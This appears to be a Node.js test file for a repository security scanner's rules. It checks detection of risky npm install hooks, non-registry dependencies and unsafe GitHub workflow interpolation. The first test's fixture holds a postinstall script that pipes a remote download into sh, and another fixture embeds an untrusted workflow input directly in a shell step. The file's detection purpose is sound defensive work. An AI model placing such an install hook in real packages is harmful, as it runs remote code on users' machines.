const test = require("node:test");
const assert = require("node:assert/strict");

function loadRules() {
  const modulePath = require.resolve("../advanced-rules.js");
  delete require.cache[modulePath];
  global.window = {
    RepoShieldScanner: {
      scanText(_text, _path, _owner, _repo, _branch, findings) { return findings || []; },
      sourceUrl(owner, repo, branch, path, line) {
        return "https://github.com/" + owner + "/" + repo + "/blob/" + branch + "/" + path + "#L" + line;
      },
      redactEvidence(line) { return String(line).slice(0, 180); }
    }
  };
  require("../advanced-rules.js");
  return global.window.RepoShieldScanner;
}

test("flags risky npm lifecycle commands without executing them", () => {
  const scanner = loadRules();
  const source = JSON.stringify({ scripts: { postinstall: "curl https://example.invalid/install.sh | sh" } }, null, 2);
  const findings = scanner.scanText(source, "package.json", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Risky npm lifecycle script: postinstall" && f.severity === "high"));
});

test("flags Git URL dependencies for source review", () => {
  const scanner = loadRules();
  const source = JSON.stringify({ dependencies: { "sample-package": "git+https://example.invalid/org/package.git" } }, null, 2);
  const findings = scanner.scanText(source, "package.json", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Non-registry dependency source"));
});

test("flags workflow inputs embedded in shell source", () => {
  const scanner = loadRules();
  const expression = "$" + "{{ github.event.inputs.name }}" ;
  const source = "steps:\n  - run: echo \"" + expression + "\"";
  const findings = scanner.scanText(source, ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Workflow input interpolated directly into shell"));
});

test("does not flag an ordinary npm lifecycle script", () => {
  const scanner = loadRules();
  const source = JSON.stringify({ scripts: { postinstall: "node scripts/build-native.js" } });
  const findings = scanner.scanText(source, "package.json", "owner", "repo", "main", []);
  assert.equal(findings.length, 0);
});
